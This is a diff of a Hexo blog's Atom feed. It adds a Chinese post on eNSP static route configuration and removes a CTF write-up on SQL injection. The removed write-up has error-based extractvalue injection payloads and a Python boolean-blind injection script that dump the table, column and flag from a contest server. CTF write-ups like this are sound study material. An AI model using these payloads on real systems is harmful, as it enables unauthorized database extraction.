@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-12T02:58:46.941Z</updated>
+  <updated>2018-03-19T05:39:27.432Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>eNSP静态路由配置</title>
+    <link href="http://yoursite.com/2018/03/18/routestatic/"/>
+    <id>http://yoursite.com/2018/03/18/routestatic/</id>
+    <published>2018-03-18T15:32:19.761Z</published>
+    <updated>2018-03-19T05:39:27.432Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong></p><h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p><p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p><h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1sysysname r1int e0/0/0ip add 10.10.10.1 24qint g0/0/0ip add 2.2.2.2 30qint g0/0/1ip add 3.3.3.2 30qR2sysysname r2int e0/0/0ip add 192.168.2.1 24qint g0/0/0ip add 2.2.2.1 301int g0/0/1ip add 1.1.1.1 30qR3sysysname r3int e0/0/0ip add 172.16.2.1 24qint g0/0/0ip add 4.4.4.1 30qint g0/0/1ip add 3.3.3.1 24qR4sysysname r4int g0/0/1ip add 1.1.1.2 30qint g0/0/0ip add 4.4.4.2 30q</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p><pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p><pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p><p><strong>PC1到PC2之间的通信配置</strong></p><pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p><pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p><pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;eNSP静态路由配置&quot;&gt;&lt;a href=&quot;#eNSP静态路由配置&quot; class=&quot;headerlink&quot; title=&quot;eNSP静态路由配置&quot;&gt;&lt;/a&gt;eNSP静态路由配置&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink
+      
+    
+    </summary>
+    
+      <category term="网络基础" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
+    
+    
+      <category term="网络基础" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
+    
+  </entry>
   
   <entry>
     <title>N1CTF2018 77777 writeup</title>
@@ -488,31 +513,6 @@
     
     
       <category term="shadowsocks" scheme="http://yoursite.com/tags/shadowsocks/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第三届上海市大学生网络安全大赛注入题writeup</title>
-    <link href="http://yoursite.com/2017/11/05/Some%20Words/"/>
-    <id>http://yoursite.com/2017/11/05/Some Words/</id>
-    <published>2017-11-05T12:54:31.315Z</published>
-    <updated>2017-11-05T12:54:31.333Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="题目-Some-Words"><a href="#题目-Some-Words" class="headerlink" title="题目:Some Words"></a>题目:Some Words</h1><p>事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下</p><p>进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下:</p><p><code>&#39;,and,union,where,=,updatexml,rand,group_concat等</code></p><p>一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法:</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>虽然过滤了updatexml,rand等报错注入关键字,但是没有过extractvalue<br>,过滤了and,可以用or代替，过滤了=可以用like代替,所以可以构造payload:</p><p><code>?id=1 or extractvalue(1,concat(0x3a,database(),0x3a))--+</code>,</p><p>用extractvalue函数的特性报错爆出当前数据库名为<code>words</code>，该报错原理是因为extractvalue函数的第二个参数必须为XPATH格式的，但是concat连接函数返回的是字符串，格式不符合，所以报错并显示出该字符串的内容，接下来构造payload:</p><p><code>?id=1 or extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema like database() limit 0,1),0x3a))--+</code></p><p>爆出words数据库下的第一个表名为<code>f14g</code>,用双引号代替单引号继续构造payload:</p><p><code>?id=1 or extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name like &quot;f14g&quot; limit 0,1),0x3a))--+</code></p><p>爆出f14g表下存在一个名为f14g的列名,于是构造payload:</p><p><code>?id=1 or extractvalue(1,concat(0x3a,(select f14g from f14g),0x3a))--+</code></p><p>发现这个payload是不完整的,显示的是前31个字节,我们查一下长度:</p><p><code>?id=1 or extractvalue(1,concat(0x3a,(select length(f14g) from f14g),0x3a))--+</code></p><p>结果为42</p><p>构造</p><blockquote><p><code>?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,1,31) from f14g),0x3a))--+</code></p><p><code>?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,32,42) from f14g),0x3a))--+</code></p></blockquote><p>读取完整f14g:flag{93303476-a738-441b-9800-90719f16eb85}</p><p>注:f14g是随机生成的，每一次做题f14g都不一样</p><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><p>过滤了and,我们可以用or(或)或者是^(位异或)进行逻辑判断,贴出我用python写的盲注脚本,代码写得很烂,求大佬们不要喷:</p><pre><code>import requestsdef gettablelen(url):    i=1    while 1:        payload=url+&quot;?id=-1 or (select length(table_name) from information_schema.tables where table_schema like database() limit 0,1) like %d--+&quot;%(i)        html=requests.get(url=payload).content        if html.find(&quot;Hello Hacker!!&quot;)!=-1:            print &quot;table length:%d&quot;%(i)            break        else:            i=i+1    return idef gettable(url,len):    table=&quot;&quot;    for i in range(1,len+1):        for j in range(255):            payload=url+&quot;?id=-1 or ascii(substr((select table_name from information_schema.tables where table_schema like database() limit 0,1),%d,1)) like %d--+&quot;%(i,j)            html=requests.get(url=payload).content            if html.find(&quot;Hello Hacker!!&quot;)!=-1:                print chr(j)                table=table+chr(j)                break    return tabledef getcolumnlen(url,table):    i=1    while 1:        payload=url+&apos;?id=-1 or (select length(column_name) from information_schema.columns where table_name like &quot;%s&quot; limit 0,1) like %d--+&apos;%(table,i)        html=requests.get(url=payload).content        if html.find(&quot;Hello Hacker!!&quot;)!=-1:            print &quot;column length:%d&quot;%(i)            break        else:            i=i+1    return idef getcolumn(url,len,table):    column=&quot;&quot;    for i in range(1,len+1):        for j in range(255):            payload=url+&apos;?id=-1 or ascii(substr((select column_name from information_schema.columns where table_name like &quot;%s&quot; limit 0,1),%d,1)) like %d--+&apos;%(table,i,j)            html=requests.get(url=payload).content            if html.find(&quot;Hello Hacker!!&quot;)!=-1:                print chr(j)                column=column+chr(j)                break    return columndef getflaglen(url,table,column):    i=1    while 1:        payload=url+&apos;?id=-1 or (select length(%s) from %s limit 0,1) like %d--+&apos;%(column,table,i)        html=requests.get(url=payload).content        if html.find(&quot;Hello Hacker!!&quot;)!=-1:            print &quot;flag length:%d&quot;%(i)            break        else:            i=i+1    return idef getflag(url,table,column,len):    flag=&quot;&quot;    for i in range(1,len+1):        for j in range(255):            payload=url+&apos;?id=-1 or ascii(substr((select %s from %s limit 0,1),%d,1)) like %d--+&apos;%(column,table,i,j)            html=requests.get(url=payload).content            if html.find(&quot;Hello Hacker!!&quot;)!=-1:                print chr(j)                flag=flag+chr(j)                break    return flagdef main():    url=&quot;http://cdb627a8a4974a5f92615994c9e6199abda58b73f6364df1.game.ichunqiu.com/index.php&quot;    tlen=gettablelen(url)    table=gettable(url,tlen)    print table    clen=getcolumnlen(url,table)    column=getcolumn(url,clen,table)    print &quot;%s column is %s&quot;%(table,column)    flen=getflaglen(url,table,column)    print &quot;flag len:%d&quot;%(flen)    flag=getflag(url,table,column,flen)    print flagif __name__==&apos;__main__&apos;:    main()</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;题目-Some-Words&quot;&gt;&lt;a href=&quot;#题目-Some-Words&quot; class=&quot;headerlink&quot; title=&quot;题目:Some Words&quot;&gt;&lt;/a&gt;题目:Some Words&lt;/h1&gt;&lt;p&gt;事先不知道有这个比赛，同学在群里发的链接，正好是自己
-      
-    
-    </summary>
-    
-      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
     
   </entry>
   
